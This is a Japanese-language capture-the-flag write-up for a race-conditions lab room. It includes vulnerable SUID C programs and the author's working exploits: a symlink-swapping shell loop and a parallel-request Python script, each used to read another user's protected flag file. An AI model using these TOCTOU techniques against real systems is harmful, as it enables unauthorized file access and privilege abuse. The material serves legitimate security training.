# Race Conditions Challenge CTF

https://tryhackme.com/room/raceconditions

## walk

```sh
race@ip-10-48-190-195:/home/walk$ ls -al
total 44
drwxr-xr-x 2 walk walk  4096 Mar 27  2023 .
drwxr-xr-x 8 root root  4096 Dec 10 05:40 ..
-rwsr-sr-x 1 walk walk 16368 Mar 27  2023 anti_flag_reader
-rw-r--r-- 1 walk walk  1071 Mar 27  2023 anti_flag_reader.c
-rw-r--r-- 1 walk walk   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 walk walk  3771 Jan  6  2022 .bashrc
-rw------- 1 walk walk    41 Mar 27  2023 flag
-rw-r--r-- 1 walk walk   807 Jan  6  2022 .profile
```

anti_flag_reader.c

```c
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {

    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: anti_flag_reader <FILE>");
        return 1;
    }
    
    puts("Checking if 'flag' is in the provided file path...");
    int path_check = strstr(argv[1], "flag");
    puts("Checking if the file is a symlink...");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    puts("<Press Enter to continue>");
    getchar();
    
    if (path_check || symlink_check) {
        puts("Nice try, but I refuse to give you the flag!");
        return 1;
    } else {
        puts("This file can't possibly be the flag. I'll print it out for you:\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
```

### チェック処理

1. パラメータの path に flag が含まれていないこと
2. pathがシンボリックリンクではないこと

### 方針

1. 何か適当な名前のファイルを作る（/tmp/file というファイルにする）
2. 入力待ち状態で、ファイルを消し、/home/walk/flag へのリンクを作り直す
3. Enterを押して処理を進める

### エクスプロイト

access関数がエラーになって開けないという問題に遭遇してドハマりした。

```sh
race@ip-10-48-190-195:~$ ../walk/anti_flag_reader /tmp/file
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>

This file can't possibly be the flag. I'll print it out for you:

anti_flag_reader: anti_flag_reader.c:33: main: Assertion `fd >= 0 && "Failed to open the file"' failed.
Aborted (core dumped)
```

結論だけ言うと、/tmp/file ではなく、/home/race/file としてシンボリックリンクを作ると成功した。

調べたところ、下記の設定が影響しているのではないかと思われるが、権限不足で確認できない。  
これが1の場合、/tmp 内のリンクは、リンクの所有者以外からのアクセスを制限することがあるらしい。  
kali のデフォルト設定では1になっていた。

```sh
race@ip-10-48-190-195:~$ cat /proc/sys/fs/protected_symlinks
cat: /proc/sys/fs/protected_symlinks: Permission denied
```

## run

```sh
race@ip-10-48-190-195:/home/run$ ls -al
total 44
drwxr-xr-x 2 run  run   4096 Mar 27  2023 .
drwxr-xr-x 8 root root  4096 Dec 10 05:40 ..
-rw-r--r-- 1 run  run    220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 run  run   3771 Jan  6  2022 .bashrc
-rwsr-sr-x 1 run  run  16360 Mar 27  2023 cat2
-rw-r--r-- 1 run  run   1378 Mar 27  2023 cat2.c
-rw------- 1 run  run     46 Mar 27  2023 flag
-rw-r--r-- 1 run  run    807 Jan  6  2022 .profile
```

cat2.c

```c
#include <stdio.h>
#include <unistd.h>
#include <assert.h>

int main(int argc, char **argv, char **envp) {

    int fd;
    int n;
    int context; 
    char buf[1024];

    if (argc != 2) {
        puts("Usage: cat2 <FILE>");
        return 1;
    }

    puts("Welcome to cat2!");
    puts("This program is a side project I've been working on to be a more secure version of the popular cat command");
    puts("Unlike cat, the cat2 command performs additional checks on the user's security context");
    puts("This allows the command to be security compliant even if executed with SUID permissions!\n");
    puts("Checking the user's security context...");
    context = check_security_contex(argv[1]);
    puts("Context has been checked, proceeding!\n");

    if (context == 0) {
        puts("The user has access, outputting file...\n");
        fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    } else {
        puts("[SECURITY BREACH] The user does not have access to this file!");
        puts("Terminating...");
        return 1;
    }
    
    return 0;
}

int check_security_contex(char *file_name) {

    int context_result;

    context_result = access(file_name, R_OK);
    usleep(500);

    return context_result;
}
```

### チェック処理

1. access関数を実行
2. 500ミリ秒スリープ
3. open実行

access関数は、SUIDに関係なく、実際に実行しているユーザーのUIDで評価されることは知っている。

### エクスプロイト

Sleepを使い、リンクが存在する確率をわずかに高くしている。

```sh
while true; do
    rm /home/race/file
    echo 'hello' > /home/race/file
    rm /home/race/file
    ln -sf /home/run/flag /home/race/file
    sleep 0.0001
done &
```

```sh
while true; do
    /home/run/cat2 /home/race/file 2>/dev/null | grep THM
done
```

## sprint

```sh
race@ip-10-48-190-195:/home/sprint$ ls -al
total 48
drwxr-xr-x 2 sprint sprint  4096 Mar 27  2023 .
drwxr-xr-x 8 root   root    4096 Dec 10 05:40 ..
-rwsr-sr-x 1 sprint sprint 17032 Mar 27  2023 bankingsystem
-rw-r--r-- 1 sprint sprint  2888 Mar 27  2023 bankingsystem.c
-rw-r--r-- 1 sprint sprint   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 sprint sprint  3771 Jan  6  2022 .bashrc
-rw------- 1 sprint sprint    40 Mar 27  2023 flag
-rw-r--r-- 1 sprint sprint   807 Jan  6  2022 .profile
```

bankingsystem.c

```c
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>

typedef struct {
    int sock;
    struct sockaddr address;
    int addr_len;
} connection_t;

int money;

void *run_thread(void *ptr) {

    long addr;
    char *buffer;
    int buffer_len = 1024;
    char balance[512];
    int balance_length;
    connection_t *conn;

    if (!ptr) pthread_exit(0);

    conn = (connection_t *)ptr;
    addr = (long)((struct sockaddr_in *) &conn->address)->sin_addr.s_addr;
    buffer = malloc(buffer_len + 1);
    buffer[buffer_len] = 0;
    
    read(conn->sock, buffer, buffer_len);
    
    if (strstr(buffer, "deposit")) {
        money += 10000;
    } else if (strstr(buffer, "withdraw")) {
        money -= 10000;
    } else if (strstr(buffer, "purchase flag")) {
        if (money >= 15000) {
            sendfile(conn->sock, open("/home/sprint/flag", O_RDONLY), 0, 128);
            money -= 15000;
        } else {
            write(conn->sock, "Sorry, you don't have enough money to purchase the flag\n", 56);
        }
    }

    balance_length = snprintf(balance, 1024, "Current balance: %d\n", money);
    write(conn->sock, balance, balance_length);
    
    usleep(1);
    money = 0;
    
    close(conn->sock);
    free(buffer);
    free(conn);
    
    pthread_exit(0);
}

int main(int argc, char **argv) {

    int sock = -1;
    int port = 1337;
    struct sockaddr_in address;
    connection_t *connection;
    pthread_t thread;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    if (bind(sock, (struct sockaddr *) &address, sizeof(struct sockaddr_in)) < 0) {
        fprintf(stderr, "Cannot bind to port %d\n", port);
        return -1;
    }
    
    if (listen(sock, 32) < 0) {
        fprintf(stderr, "Cannot listen on port %d\n", port);
        return -1;
    }

    fprintf(stdout, "Listening for connections on port %d...\n", port);
    fprintf(stdout, "Accepted commands: \"deposit\", \"withdraw\", \"purchase flag\"\n");

    while (1) {
        connection = (connection_t *) malloc(sizeof(connection_t));
        connection->sock = accept(sock, &connection->address, &connection->addr_len);
        if (connection->sock <= 0) {
            free(connection);
        } else {
            fprintf(stdout, "Connection received! Creating a new handler thread...\n");
            pthread_create(&thread, 0, run_thread, (void *) connection);
            pthread_detach(thread);
        }
    }
    
    return 0;
}
```

### エクスプロイト

deposit 2回が処理し終わらないうちに、purchase flag が実行されればよい。

```python
import asyncio
import sys

HOST = "127.0.0.1"
PORT = 1337

async def send_and_print(message):
    try:
        reader, writer = await asyncio.open_connection(HOST, PORT)
        writer.write(message.encode() + b"\n")
        await writer.drain()

        try:
            data = await asyncio.wait_for(reader.read(4096), timeout=0.1)
            if data:
                sys.stdout.write(data.decode(errors="ignore"))
                sys.stdout.flush()
        except asyncio.TimeoutError:
            pass

        writer.close()
        await writer.wait_closed()
    except Exception as e:
        pass

async def attack_loop():
    while True:
        # deposit, deposit, purchase を並列で投げる
        await asyncio.gather(
            send_and_print("deposit"),
            send_and_print("deposit"),
            send_and_print("purchase flag")
        )

asyncio.run(attack_loop())
```

```sh
race@ip-10-48-190-195:~$ python3 ./race3.py | grep THM
```

## 振り返り

- 競合のロジック自体は単純で難易度は低めに感じた。
- /tmp 内に作ったシンボリックリンクは、リンク所有者以外は開けない設定があるということを初めて知った。（おそらく多くの環境でデフォルトでそうなっている）

## Tags

#tags:競合
